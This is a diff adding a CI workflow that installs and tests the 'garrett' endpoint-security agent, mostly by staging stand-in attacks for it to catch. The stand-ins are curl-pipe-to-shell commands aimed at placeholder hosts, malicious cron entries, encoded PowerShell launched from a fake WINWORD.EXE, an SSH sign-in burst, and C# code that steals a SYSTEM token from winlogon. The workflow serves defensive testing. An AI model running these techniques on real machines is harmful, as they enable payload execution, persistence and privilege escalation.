@@ -1,0 +1,851 @@
+# garrett on real Linux, macOS and Windows machines.
+#
+#   linux, macos, windows       install the published garrett the way a user would, from the public site; stage a
+#                               harmless stand-in for an attack; check that it is ended and recorded; check fleet
+#                               blocking; remove it and check nothing is left. These three run only when the
+#                               workflow is started by hand, which is done after every release
+#   service-linux, -windows     the one-line service install, and a machine joining it
+#   rust, rust-agent-*          the agent built from this commit: its recorded decisions, then the real thing
+#                               running on each system
+#   small-devices               the agent built for 32-bit ARM with its tests run under an emulated processor, and
+#                               the bundle installed as an OpenRC service on a system with no systemd
+#   update-*                    an installed agent brings itself up to a newer version, and refuses one that is
+#                               not signed or does not match its signed list
+#   tests                       the service's own tests
+#
+# Run it from the Actions tab (Run workflow) or:  gh workflow run verify.yml
+name: verify
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+  pull_request:
+permissions:
+  contents: read
+env:
+  BASE: https://gary23w.github.io/sentinels
+jobs:
+  tests:
+    strategy:
+      fail-fast: false
+      matrix:
+        os: [ubuntu-latest, macos-latest, windows-latest]
+    runs-on: ${{ matrix.os }}
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 24
+      - name: Service tests
+        run: cd server && npm test
+        shell: bash
+
+  linux:
+    if: github.event_name == 'workflow_dispatch'
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Install with the one-line installer
+        run: curl -fsSL "$BASE/install.sh" | sudo sh
+      - name: It is running, by itself, from the signed repository
+        run: |
+          sleep 6
+          systemctl is-active garrett
+          apt-cache policy garrett | sed -n 1,3p
+          grep -q "signed-by=/usr/share/keyrings/garrett.gpg" /etc/apt/sources.list.d/garrett.list
+          garrett status
+      # An install that writes a configuration file (as a join command does) must leave apt able to read the key.
+      - name: Installing again with options keeps the repository readable
+        run: |
+          curl -fsSL "$BASE/install.sh" | sudo sh -s -- --label verify
+          test "$(stat -c %a /usr/share/keyrings/garrett.gpg)" = 644
+          test "$(sudo stat -c %a /etc/garrett/garrett.conf)" = 600
+          sudo apt-get update -o Dir::Etc::sourcelist=/etc/apt/sources.list.d/garrett.list -o Dir::Etc::sourceparts=- -o APT::Get::List-Cleanup=0 2>&1 | tee /tmp/update.txt
+          ! grep -E "^(W|E):" /tmp/update.txt
+      - name: A stand-in web shell is ended and recorded
+        run: |
+          mkdir -p /tmp/gv && cp "$(command -v bash)" /tmp/gv/php-fpm8.3
+          /tmp/gv/php-fpm8.3 -c 'sh -c "curl -s -m 120 http://203.0.113.9/p | sh"; true' &
+          for i in $(seq 1 45); do sleep 1; pgrep -f "203.0.113.9/p" >/dev/null || { echo "ended after about $i seconds"; break; }; done
+          ! pgrep -f "203.0.113.9/p"
+          # The program is ended first and written down when that sample finishes, which can be a few seconds later.
+          for i in $(seq 1 30); do sudo garrett cases | grep -q "stopped" && break; sleep 1; done
+          sudo garrett cases
+          sudo garrett cases | grep -q "stopped"
+      - name: Fleet blocking refuses an address and lets it through again
+        run: |
+          sudo apt-get install -y nftables >/dev/null
+          (cd rust && cargo test --release --locked --test live --no-run)
+          live=$(ls rust/target/release/deps/live-* | grep -v '\.d$' | head -1)
+          sudo env GARRETT_LIVE_ADDRESS=1.0.0.1 "$live" --ignored --nocapture live_block
+      - name: Root that no program granted is noticed
+        run: |
+          sudo apt-get install -y libcap2-bin gcc >/dev/null
+          live=$(ls rust/target/release/deps/live-* | grep -v '\.d$' | head -1)
+          sudo "$live" --ignored --nocapture live_jump
+      - name: The machine below the system can be read
+        run: |
+          (cd rust && cargo build --release --locked)
+          sudo rust/target/release/garrett --state-dir /tmp/garrett-below hardware | tee /tmp/below.txt
+          grep -q "boot protection" /tmp/below.txt && grep -q "firmware" /tmp/below.txt
+      - name: Removal leaves nothing
+        run: |
+          sudo apt-get purge -y garrett >/dev/null
+          for p in /usr/lib/garrett /usr/bin/garrett /var/lib/garrett /etc/garrett; do if [ -e "$p" ]; then echo "left behind: $p"; exit 1; fi; done
+
+  macos:
+    if: github.event_name == 'workflow_dispatch'
+    runs-on: macos-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Install with the one-line installer
+        run: curl -fsSL "$BASE/install.sh" | sudo sh
+      - name: It is running as a LaunchDaemon
+        run: |
+          sleep 8
+          sudo launchctl print system/com.garrett.agent | grep -E "state = |pid = " | head -3
+          sudo launchctl print system/com.garrett.agent | grep -q "state = running"
+          garrett status
+          sudo cat /var/log/garrett.log | tail -5
+      - name: A stand-in web shell is ended and recorded
+        run: |
+          mkdir -p /tmp/gv && cp /bin/bash /tmp/gv/php-fpm8.3
+          /tmp/gv/php-fpm8.3 -c 'sh -c "curl -s -m 120 http://203.0.113.9/p | sh"; true' &
+          for i in $(seq 1 60); do sleep 1; pgrep -f "203.0.113.9/p" >/dev/null || { echo "ended after about $i seconds"; break; }; done
+          sudo tail -5 /var/log/garrett.log
+          ! pgrep -f "203.0.113.9/p"
+          # The program is ended first and written down when that sample finishes, which can be a few seconds later.
+          for i in $(seq 1 30); do sudo garrett cases | grep -q "stopped" && break; sleep 1; done
+          sudo garrett cases
+          sudo garrett cases | grep -q "stopped"
+      - name: Fleet blocking refuses an address and lets it through again
+        run: |
+          (cd rust && cargo test --release --locked --test live --no-run)
+          live=$(ls rust/target/release/deps/live-* | grep -v '\.d$' | head -1)
+          sudo env GARRETT_LIVE_ADDRESS=1.0.0.1 "$live" --ignored --nocapture live_block
+      - name: The network card can be read for arriving connection attempts
+        run: |
+          live=$(ls rust/target/release/deps/live-* | grep -v '\.d$' | head -1)
+          sudo "$live" --ignored --nocapture live_card
+      - name: The machine below the system can be read
+        run: |
+          (cd rust && cargo build --release --locked)
+          sudo rust/target/release/garrett --state-dir /tmp/garrett-below hardware | tee /tmp/below.txt
+          grep -q "boot protection" /tmp/below.txt && grep -q "firmware" /tmp/below.txt
+      - name: Removal leaves nothing
+        run: |
+          curl -fsSL "$BASE/garrett-macos.tar.gz" | tar -xz -C /tmp
+          sudo sh /tmp/garrett/install.sh --remove
+          for p in /usr/local/lib/garrett /usr/local/bin/garrett /usr/local/var/garrett /Library/LaunchDaemons/com.garrett.agent.plist; do if [ -e "$p" ]; then echo "left behind: $p"; exit 1; fi; done
+
+  windows:
+    if: github.event_name == 'workflow_dispatch'
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+      # The published one-line installer, in Windows PowerShell 5.1: what a person pastes into an elevated window.
+      - name: Install with the one-line installer
+        shell: powershell
+        run: |
+          irm "$env:BASE/install.ps1" | iex
+      - name: It is running as SYSTEM
+        shell: pwsh
+        run: |
+          Start-Sleep -Seconds 10
+          $task = Get-ScheduledTask -TaskName garrett
+          "state: $($task.State) | runs as: $($task.Principal.UserId) | program: $($task.Actions[0].Execute)"
+          if ($task.State -ne 'Running' -or $task.Principal.UserId -ne 'SYSTEM' -or $task.Actions[0].Execute -notlike '*\garrett\garrett.exe') { throw 'the task is not running as expected' }
+          & "$env:ProgramFiles\garrett\garrett.cmd" status
+      - name: A stand-in malicious document is ended and recorded
+        shell: pwsh
+        run: |
+          $work = Join-Path $env:TEMP 'gv'; New-Item -ItemType Directory -Force $work | Out-Null
+          $word = Join-Path $work 'WINWORD.EXE'; Copy-Item (Join-Path $env:SystemRoot 'System32\cmd.exe') $word
+          $beat = Join-Path $work 'beat.txt'
+          $script = "while(`$true){ Set-Content -LiteralPath '$beat' -Value (Get-Date).Ticks; Start-Sleep -Milliseconds 200 }"
+          $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
+          $parent = Start-Process -FilePath $word -ArgumentList '/c', 'powershell.exe', '-NoProfile', '-NonInteractive', '-EncodedCommand', $encoded -PassThru -WindowStyle Hidden
+          $ended = $null
+          foreach ($i in 1..60) {
+            Start-Sleep -Seconds 1
+            $child = Get-CimInstance Win32_Process -Filter "ParentProcessId=$($parent.Id) AND Name='powershell.exe'"
+            if ($i -gt 2 -and -not $child) { $ended = $i; break }
+          }
+          Stop-Process -Id $parent.Id -Force -ErrorAction SilentlyContinue
+          if (-not $ended) { & "$env:ProgramFiles\garrett\garrett.cmd" cases; throw 'the stand-in was still running after 60 seconds' }
+          "ended after about $ended seconds"
+          # The program is ended first and written down when that sample finishes, which can be a few seconds later.
+          $recorded = $false
+          foreach ($i in 1..40) { if ((& "$env:ProgramFiles\garrett\garrett.cmd" cases) -match 'powershell\.exe\s+\[stopped\]') { $recorded = $true; "recorded about $i seconds later"; break }; Start-Sleep -Seconds 1 }
+          & "$env:ProgramFiles\garrett\garrett.cmd" cases
+          if (-not $recorded) { throw 'no stopped case was recorded' }
+      - name: Fleet blocking refuses an address and lets it through again
+        shell: pwsh
+        run: |
+          $env:GARRETT_LIVE_ADDRESS = '1.0.0.1'
+          Push-Location rust; cargo test --release --locked --test live -- --ignored --nocapture live_block; $code = $LASTEXITCODE; Pop-Location
+          $left = @(Get-NetFirewallRule -DisplayName 'Garrett fleet block' -ErrorAction SilentlyContinue).Count
+          "rules left: $left"
+          if ($code -ne 0 -or $left -ne 0) { throw 'fleet blocking did not behave as expected' }
+      - name: A SYSTEM shell started by a person's program is noticed
+        shell: pwsh
+        run: |
+          # A stand-in for a privilege escalation: this session's own shell starts cmd.exe with the machine's own account.
+          Add-Type @'
+          using System; using System.Diagnostics; using System.Runtime.InteropServices;
+          public static class Up {
+            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)] public struct Start { public int cb; public string reserved, desktop, title; public int x, y, xSize, ySize, xChars, yChars, fill, flags; public short show, reserved2; public IntPtr reserved3, input, output, error; }
+            [StructLayout(LayoutKind.Sequential)] public struct Made { public IntPtr process, thread; public int pid, tid; }
+            [DllImport("advapi32", SetLastError = true)] public static extern bool OpenProcessToken(IntPtr process, uint access, out IntPtr token);
+            [DllImport("advapi32", SetLastError = true)] public static extern bool DuplicateTokenEx(IntPtr token, uint access, IntPtr attributes, int level, int type, out IntPtr made);
+            [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)] public static extern bool CreateProcessWithTokenW(IntPtr token, int logon, string application, string command, int creation, IntPtr environment, string directory, ref Start start, out Made made);
+            public static int Run(string name, string command) {
+              Process.EnterDebugMode();
+              foreach (var source in Process.GetProcessesByName(name)) {
+                IntPtr token, primary;
+                try { if (!OpenProcessToken(source.Handle, 0x0002, out token)) continue; } catch { continue; }
+                if (!DuplicateTokenEx(token, 0x02000000, IntPtr.Zero, 2, 1, out primary)) continue;
+                var start = new Start(); start.cb = Marshal.SizeOf(start); Made made;
+                if (CreateProcessWithTokenW(primary, 0, null, command, 0x08000000, IntPtr.Zero, null, ref start, out made)) return made.pid;
+              }
+              return 0;
+            }
+          }
+          '@
+          $made = 0
+          foreach ($name in 'winlogon', 'services', 'spoolsv', 'svchost') { $made = [Up]::Run($name, 'cmd.exe /c ping -n 60 127.0.0.1'); if ($made) { "made from $name"; break } }
+          if (-not $made) { throw 'no stand-in could be started' }
+          $env:GARRETT_LIVE_PID = "$made"
+          Push-Location rust; cargo test --release --locked --test live -- --ignored --nocapture live_system_shell; $code = $LASTEXITCODE; Pop-Location
+          Stop-Process -Id $made -Force -ErrorAction SilentlyContinue
+          if ($code) { throw 'the live check failed' }
+      - name: The machine below the system can be read
+        shell: pwsh
+        run: |
+          Push-Location rust; cargo build --release --locked; Pop-Location
+          $said = & rust\target\release\garrett.exe --state-dir "$env:TEMP\garrett-below" hardware
+          $said
+          if (-not ($said -match 'boot protection') -or -not ($said -match 'firmware')) { throw 'the reading is missing' }
+      - name: Removal leaves nothing
+        shell: pwsh
+        run: |
+          # The uninstaller ships in the bundle, which the one-line installer unpacked elsewhere and cleaned up.
+          Invoke-WebRequest -Uri "$env:BASE/garrett-windows.zip" -OutFile garrett-windows.zip
+          Expand-Archive garrett-windows.zip -DestinationPath .
+          & .\garrett\deploy\uninstall-windows.ps1
+          if (Get-ScheduledTask -TaskName garrett -ErrorAction SilentlyContinue) { throw 'the task is still there' }
+          foreach ($folder in "$env:ProgramFiles\garrett", "$env:ProgramData\garrett") { if (Test-Path $folder) { throw "left behind: $folder" } }
+
+  # The self-hosted service, built from this checkout and served the way the site serves it: one line makes the
+  # machine a Sentinel service, a machine joins with the printed command, its case reaches the service.
+  service-linux:
+    runs-on: ubuntu-latest
+    env:
+      GARRETT_BASE: http://127.0.0.1:8765
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build the bundles and serve them
+        run: |
+          (cd rust && cargo build --release --locked)
+          mkdir -p agents && cp rust/target/release/garrett agents/garrett-linux-x86_64
+          python3 -B packaging/build-release.py site --agents agents >/dev/null
+          cp packaging/service.sh packaging/install.sh site/
+          (cd site && nohup python3 -m http.server 8765 --bind 127.0.0.1 >/dev/null 2>&1 &)
+          sleep 1
+      - name: One line makes this machine a Sentinel service
+        run: |
+          curl -fsSL "$GARRETT_BASE/service.sh" | sudo GARRETT_BASE="$GARRETT_BASE" sh -s -- --address 127.0.0.1 | sed -E 's/[a-f0-9]{64}/<hidden>/g'
+          systemctl is-active garrett-service
+          test "$(stat -c %U "/proc/$(systemctl show -p MainPID --value garrett-service)")" = garrett-service
+      - name: A machine joins with the printed key and its case reaches the service
+        run: |
+          KEY=$(sudo garrett-service join | sed -n 's/.*--key \([a-f0-9.]*\).*/\1/p' | head -1)
+          echo "::add-mask::$KEY"
+          mkdir -p /tmp/gt && tar -xzf site/garrett-linux-x86_64.tar.gz -C /tmp/gt
+          sudo mkdir -p /etc/garrett
+          printf 'SERVER=https://127.0.0.1:8443\nENROLL_KEY=%s\n' "$KEY" | sudo tee /etc/garrett/garrett.conf >/dev/null
+          sudo sh /tmp/gt/garrett/install.sh
+          sleep 10
+          garrett status
+          sudo garrett-service devices | grep -q '"enrolled":1'
+          mkdir -p /tmp/gv && cp "$(command -v bash)" /tmp/gv/php-fpm8.3
+          /tmp/gv/php-fpm8.3 -c 'sh -c "curl -s -m 120 http://203.0.113.9/p | sh"; true' &
+          for i in $(seq 1 45); do sleep 1; pgrep -f "203.0.113.9/p" >/dev/null || { echo "ended after about $i seconds"; break; }; done
+          ! pgrep -f "203.0.113.9/p"
+          for i in $(seq 1 40); do sudo garrett-service cases | grep -q "php-fpm8.3" && break; sleep 1; done
+          sudo garrett-service cases | grep -o '"title":"[^"]*"' | head -3
+          sudo garrett-service cases | grep -q "php-fpm8.3"
+      - name: A wrong certificate pin is refused
+        run: |
+          KEY=$(sudo garrett-service join | sed -n 's/.*--key \([a-f0-9]*\)\..*/\1/p' | head -1)
+          echo "::add-mask::$KEY"
+          WRONG=$(printf 'a%.0s' $(seq 1 64))
+          if said=$(sudo /usr/lib/garrett/garrett-agent --state-dir /tmp/other enroll --server https://127.0.0.1:8443 --key "$KEY.$WRONG" 2>&1); then echo "a wrong pin was accepted"; exit 1; fi
+          echo "$said"
+          echo "$said" | grep -q "did not present the certificate"
+      - name: Removal leaves nothing
+        run: |
+          sudo sh /tmp/gt/garrett/install.sh --remove
+          curl -fsSL "$GARRETT_BASE/service.sh" | sudo GARRETT_BASE="$GARRETT_BASE" sh -s -- --remove
+          for p in /usr/lib/garrett-service /etc/garrett-service /var/lib/garrett-service /usr/bin/garrett-service /etc/systemd/system/garrett-service.service; do if [ -e "$p" ]; then echo "left behind: $p"; exit 1; fi; done
+
+  service-windows:
+    runs-on: windows-latest
+    env:
+      GARRETT_BASE: http://127.0.0.1:8765
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build the bundles and serve them
+        shell: pwsh
+        run: |
+          Push-Location rust; cargo build --release --locked; if ($LASTEXITCODE -ne 0) { throw 'the agent did not build' }; Pop-Location
+          New-Item -ItemType Directory -Force agents | Out-Null; Copy-Item rust/target/release/garrett.exe agents/garrett-windows.exe
+          python -B packaging/build-release.py site --agents agents | Out-Null
+          Copy-Item packaging/service.ps1, packaging/install.ps1 site/
+          Start-Process python -ArgumentList '-m', 'http.server', '8765', '--bind', '127.0.0.1' -WorkingDirectory site -WindowStyle Hidden
+          Start-Sleep -Seconds 2
+      # Windows PowerShell 5.1: what a person pastes into an elevated window.
+      - name: One line makes this machine a Sentinel service
+        shell: powershell
+        run: |
+          irm "$env:GARRETT_BASE/service.ps1" | iex | ForEach-Object { $_ -replace '[a-f0-9]{64}', '<hidden>' }
+          $task = Get-ScheduledTask -TaskName garrett-service
+          "state: $($task.State) | runs as: $($task.Principal.UserId)"
+          if ($task.State -ne 'Running' -or $task.Principal.UserId -notlike '*LOCAL SERVICE') { throw 'the task is not running as expected' }
+          if (-not (Get-NetFirewallRule -DisplayName 'garrett-service' -ErrorAction SilentlyContinue)) { throw 'no firewall rule' }
+      - name: A machine joins with the printed key and its case reaches the service
+        shell: powershell
+        run: |
+          $manage = "$env:ProgramFiles\garrett-service\garrett-service.cmd"
+          $line = (& $manage join) | Where-Object { $_ -match "GARRETT_KEY='([a-f0-9.]+)'" } | Select-Object -First 1
+          $null = $line -match "GARRETT_KEY='([a-f0-9.]+)'"; $key = $Matches[1]
+          "::add-mask::$key"
+          $env:GARRETT_SERVER = 'https://127.0.0.1:8443'; $env:GARRETT_KEY = $key
+          irm "$env:GARRETT_BASE/install.ps1" | iex
+          Start-Sleep -Seconds 10
+          & "$env:ProgramFiles\garrett\garrett.cmd" status
+          $devices = (& $manage devices) -join ''
+          if ($devices -notmatch '"enrolled":1') { throw 'the machine did not enrol' }
+          $work = Join-Path $env:TEMP 'gv'; New-Item -ItemType Directory -Force $work | Out-Null
+          $word = Join-Path $work 'WINWORD.EXE'; Copy-Item (Join-Path $env:SystemRoot 'System32\cmd.exe') $word
+          $beat = Join-Path $work 'beat.txt'
+          $script = "while(`$true){ Set-Content -LiteralPath '$beat' -Value (Get-Date).Ticks; Start-Sleep -Milliseconds 200 }"
+          $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
+          $parent = Start-Process -FilePath $word -ArgumentList '/c', 'powershell.exe', '-NoProfile', '-NonInteractive', '-EncodedCommand', $encoded -PassThru -WindowStyle Hidden
+          $seen = $false
+          foreach ($i in 1..90) { Start-Sleep -Seconds 1; if (((& $manage cases) -join '') -match 'powershell\.exe') { $seen = $true; "the case reached the service after about $i seconds"; break } }
+          Stop-Process -Id $parent.Id -Force -ErrorAction SilentlyContinue
+          if (-not $seen) { throw 'no case reached the service' }
+      - name: Removal leaves nothing
+        shell: powershell
+        run: |
+          Invoke-WebRequest -UseBasicParsing -Uri "$env:GARRETT_BASE/garrett-windows.zip" -OutFile garrett-windows.zip
+          Expand-Archive garrett-windows.zip -DestinationPath .
+          & .\garrett\deploy\uninstall-windows.ps1
+          & "$env:ProgramFiles\garrett-service\garrett-service.cmd" remove
+          if ($LASTEXITCODE -ne 0) { throw 'the remove command reported an error' }
+          Start-Sleep -Seconds 8
+          if (Get-ScheduledTask -TaskName garrett-service -ErrorAction SilentlyContinue) { throw 'the task is still there' }
+          if (Get-NetFirewallRule -DisplayName 'garrett-service' -ErrorAction SilentlyContinue) { throw 'the firewall rule is still there' }
+          foreach ($folder in "$env:ProgramFiles\garrett-service", "$env:ProgramData\garrett-service") { if (Test-Path $folder) { throw "left behind: $folder" } }
+
+  # The agent's decisions are recorded as fixtures (rust/tests/fixtures): every one must come out the same.
+  rust:
+    strategy:
+      fail-fast: false
+      matrix:
+        os: [ubuntu-latest, macos-latest, windows-latest]
+    runs-on: ${{ matrix.os }}
+    steps:
+      - uses: actions/checkout@v4
+      - name: The libraries are the ones listed, with the licences their authors declare
+        run: python3 -B rust/notices.py --check
+        shell: bash
+      - name: Every recorded decision comes out the same
+        run: cd rust && cargo test --locked
+        shell: bash
+      # On a real Linux machine, as root: the kernel feed reports shells that live about a millisecond, with their
+      # command lines.
+      - name: The kernel feed, live
+        if: matrix.os == 'ubuntu-latest'
+        run: |
+          cd rust && cargo build --release --locked
+          sudo ./target/release/garrett processes | wc -l
+          (sleep 1; for i in $(seq 1 20); do sh -c 'true marker-words'; done) &
+          sudo ./target/release/garrett watch-starts 4 > /tmp/feed.txt
+          tail -1 /tmp/feed.txt
+          echo "shells reported with their command line: $(grep -c 'marker-words' /tmp/feed.txt) of 20"
+          test "$(grep -c 'marker-words' /tmp/feed.txt)" -ge 15
+          grep -q '"blind":false' /tmp/feed.txt
+
+  # The whole agent, running for real on each system: what it must end is ended before it acts, and what it
+  # cleans up comes back exactly when restored.
+  rust-agent-linux:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        run: cd rust && cargo build --release --locked
+      - name: A download-and-run shell behind a program that accepts connections is ended before it acts
+        run: |
+          mkdir -p /tmp/gs-work && cd /tmp/gs-work
+          cat > service.py <<'EOF'
+          import http.server, subprocess, urllib.parse
+          class H(http.server.BaseHTTPRequestHandler):
+              def do_GET(self):
+                  q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
+                  delay, tag = q.get("d", ["0"])[0], q.get("t", ["x"])[0]
+                  subprocess.Popen(["sh", "-c", "sleep %s; curl -s -m 2 http://127.0.0.1:9/p | sh; touch /tmp/gs-work/reached-%s" % (float(delay), tag.replace("'", ""))])
+                  self.send_response(200); self.end_headers()
+              def log_message(self, *a): pass
+          http.server.ThreadingHTTPServer(("127.0.0.1", 18081), H).serve_forever()
+          EOF
+          python3 service.py &
+          sudo sh -c "nohup $GITHUB_WORKSPACE/rust/target/release/garrett --state-dir /tmp/gs-state run --mode kill --learn 0 > /tmp/agent.log 2>&1 &"
+          sleep 12
+          sent=0
+          for delay in 0 0.01 0.03 0.07 0.2 1.0; do
+            for i in 1 2 3 4 5; do
+              sent=$((sent + 1))
+              curl -s -m 3 "http://127.0.0.1:18081/?d=$delay&t=$sent" > /dev/null
+              sleep 0.25
+            done
+          done
+          sleep 6
+          sudo head -8 /tmp/agent.log
+          echo "chains that ran to the end: $(ls /tmp/gs-work | grep -c '^reached-') of $sent"
+          sudo grep -q "STOPPED" /tmp/agent.log
+          test "$(ls /tmp/gs-work | grep -c '^reached-')" = 0
+      - name: A dropped program with a scheduled job and a shell startup line is cleaned up, then restored
+        run: |
+          sudo touch /root/.bashrc
+          line='(/tmp/gl2/php-fpm8.3 5 >/dev/null 2>&1 &)'
+          job='*/5 * * * * root /tmp/gl2/php-fpm8.3 5'
+          # What each file must be again after restore, worked out before the agent can see any of it.
+          want_file=$(sha256sum < "$(command -v sleep)" | cut -d' ' -f1)
+          want_job=$(printf '%s\n' "$job" | sha256sum | cut -d' ' -f1)
+          want_shell=$( (sudo cat /root/.bashrc; printf '%s\n' "$line") | sha256sum | cut -d' ' -f1)
+          sudo mkdir -p /tmp/gl2 && sudo cp "$(command -v sleep)" /tmp/gl2/php-fpm8.3
+          sudo sh -c '/tmp/gl2/php-fpm8.3 900 &'
+          printf '%s\n' "$line" | sudo tee -a /root/.bashrc > /dev/null
+          printf '%s\n' "$job" | sudo tee /etc/cron.d/gl-two > /dev/null
+          for i in $(seq 1 25); do sudo test -e /tmp/gl2/php-fpm8.3 || break; sleep 1; done
+          sleep 3
+          sudo tail -8 /tmp/agent.log
+          if sudo test -e /tmp/gl2/php-fpm8.3; then echo "the file is still there"; exit 1; fi
+          if sudo test -e /etc/cron.d/gl-two; then echo "the scheduled job is still there"; exit 1; fi
+          if pgrep -f '/tmp/gl2/[p]hp-fpm' > /dev/null; then echo "the program is still running"; exit 1; fi
+          sudo grep -q '^# garrett-disabled .*gl2' /root/.bashrc
+          for key in $(sudo ls /tmp/gs-state/cleanup | sed 's/.json//'); do sudo rust/target/release/garrett --state-dir /tmp/gs-state restore "$key"; done
+          same() { test "$(sudo cat /tmp/gl2/php-fpm8.3 | sha256sum | cut -d' ' -f1)" = "$want_file" && test "$(sudo cat /etc/cron.d/gl-two | sha256sum | cut -d' ' -f1)" = "$want_job" && test "$(sudo cat /root/.bashrc | sha256sum | cut -d' ' -f1)" = "$want_shell"; }
+          same
+          sleep 12
+          same   # put back on purpose: not cleaned a second time
+          sudo rust/target/release/garrett --state-dir /tmp/gs-state cases
+      # A chain that is over in milliseconds, behind a program that is not named like a web server: the shell is
+      # ended before it reaches the line that writes its startup entry; an entry written with no shell at all
+      # leaves nothing to end, and is switched off as soon as it appears.
+      - name: A fast chain is ended before it leaves a startup entry; an entry written directly is switched off
+        run: |
+          cat > /tmp/svc.py <<'EOF'
+          import http.server, subprocess
+          class H(http.server.BaseHTTPRequestHandler):
+              def do_GET(self):
+                  if self.path == "/shell":   # a command injection: a shell that downloads and runs, then leaves a startup entry
+                      subprocess.run(["sh", "-c", "curl -s -m 2 http://127.0.0.1:9/p | sh; echo '* * * * * root curl -s http://127.0.0.1:9/x | sh' > /etc/cron.d/gl-shell"])
+                  else:                       # the entry alone, written with no shell at all: nothing to see but the file
+                      open("/etc/cron.d/gl-fast", "w").write("* * * * * root curl -s http://127.0.0.1:9/x | sh\n")
+                  self.send_response(200); self.end_headers()
+              def log_message(self, *a): pass
+          http.server.HTTPServer(("127.0.0.1", 18080), H).serve_forever()
+          EOF
+          sudo sh -c 'nohup python3 /tmp/svc.py >/dev/null 2>&1 &'
+          sleep 14
+          for round in 1 2 3 4 5; do
+            start=$(date +%s%N); curl -s -m 5 http://127.0.0.1:18080/shell >/dev/null; echo "the chain took $(( ($(date +%s%N) - start) / 1000000 )) ms"
+            sleep 1
+            if [ -e /etc/cron.d/gl-shell ]; then echo "round $round: the chain got as far as its startup entry"; sudo tail -6 /tmp/agent.log; exit 1; fi
+          done
+          # Each shell goes on to write its startup entry unless it is ended first: none of the five did. The case
+          # itself was said when the first shell under this program was ended, in the step before.
+          echo "chains that got as far as their startup entry: 0 of 5"
+          sleep 4
+          curl -s -m 5 http://127.0.0.1:18080/write >/dev/null
+          for i in $(seq 1 30); do [ -e /etc/cron.d/gl-fast ] || { echo "startup entry switched off within about $i seconds"; break; }; sleep 1; done
+          sleep 3
+          sudo tail -4 /tmp/agent.log
+          if [ -e /etc/cron.d/gl-fast ]; then echo "the startup entry is still there"; exit 1; fi
+          sudo sh -c 'grep -l gl-fast /tmp/gs-state/cleanup/*.json'   # the folder is root's alone
+          key=$(sudo sh -c "grep -l '\"where\":\"/etc/cron.d/gl-fast\"' /tmp/gs-state/cleanup/*.json" | head -1 | xargs basename | sed 's/.json//')
+          sudo rust/target/release/garrett --state-dir /tmp/gs-state restore "$key"
+          if [ ! -e /etc/cron.d/gl-fast ]; then echo "restore did not put the startup entry back"; sudo ls -la /etc/cron.d /tmp/gs-state/cleanup; exit 1; fi
+          sleep 12
+          # Put back on purpose: not switched off a second time.
+          if [ ! -e /etc/cron.d/gl-fast ]; then echo "the startup entry put back on purpose was switched off again"; sudo tail -12 /tmp/agent.log; sudo cat /tmp/gs-state/sentinel-startup-allowed.json; exit 1; fi
+          sudo rm -f /etc/cron.d/gl-fast
+      - name: A burst of failed SSH sign-ins is reported
+        run: |
+          sudo apt-get install -y openssh-server > /dev/null
+          sudo systemctl start ssh
+          sleep 35   # the agent has looked at the sign-in log at least once since the service started
+          # More attempts than the twenty that make a burst: the SSH service turns some connections away by itself.
+          for i in $(seq 1 60); do
+            sleep 0.3
+            ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o ConnectTimeout=5 "nobody-$i@127.0.0.1" true 2> /dev/null || true
+          done
+          for i in $(seq 1 45); do sudo rust/target/release/garrett --state-dir /tmp/gs-state cases | grep -q "SSH sign-ins from" && break; sleep 2; done
+          echo "log files: $(ls /var/log/auth.log /var/log/secure 2>/dev/null | tr '\n' ' ')| lines in a file: $(sudo grep -c 'Invalid user nobody-' /var/log/auth.log 2>/dev/null) | lines in the journal: $(sudo journalctl -q --no-pager -o cat --since -5min _COMM=sshd _COMM=sshd-session | grep -c 'Invalid user nobody-')"
+          sudo rust/target/release/garrett --state-dir /tmp/gs-state cases | tail -3
+          sudo rust/target/release/garrett --state-dir /tmp/gs-state cases | grep -q "SSH sign-ins from"
+      # The privacy shield, with no measuring day (--learn 0). The probe is a copy of curl named like a browser: an
+      # ordinary program asking would itself count as software that depends on the tracker.
+      - name: The privacy shield refuses trackers that answer from their own networks, and nothing else
+        run: |
+          G="sudo rust/target/release/garrett --state-dir /tmp/gs-state"
+          cp "$(command -v curl)" /tmp/firefox
+          probe() { code=0; /tmp/firefox -4 -s -m 8 -o /dev/null "https://$1/" || code=$?; [ "$code" != 28 ] && [ "$code" != 7 ]; }
+          for i in $(seq 1 30); do $G shield | grep -q "Refused at the firewall now: .*criteo" && break; sleep 3; done
+          $G shield
+          if probe bidder.criteo.com; then echo "a refused tracker was reached"; exit 1; fi
+          probe www.google-analytics.com
+          probe example.com
+          $G shield off
+          for i in $(seq 1 20); do probe bidder.criteo.com && break; sleep 3; done
+          probe bidder.criteo.com
+
+
+  rust-agent-macos:
+    runs-on: macos-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        run: cd rust && cargo build --release --locked
+      - name: A download-and-run shell started by a web server is ended before it acts
+        run: |
+          sudo sh -c "nohup $GITHUB_WORKSPACE/rust/target/release/garrett --state-dir /tmp/gs run --mode kill --learn 0 > /tmp/agent.log 2>&1 &"
+          mkdir -p /tmp/gi && cp /bin/bash /tmp/gi/php-fpm8.3
+          sleep 14
+          sent=0
+          for delay in 0.05 0.2 1.0; do
+            for i in 1 2 3; do
+              sent=$((sent + 1))
+              /tmp/gi/php-fpm8.3 -c "sh -c 'sleep $delay; curl -s -m 1 http://127.0.0.1:9/p | sh; touch /tmp/gi/reached-$sent'; true" 2>/dev/null &
+              sleep 0.5
+            done
+          done
+          sleep 6
+          sudo head -12 /tmp/agent.log
+          echo "markers that appeared: $(ls /tmp/gi | grep -c '^reached-') of $sent"
+          sudo pkill -f 'garrett --state-dir /tmp/gs' || true
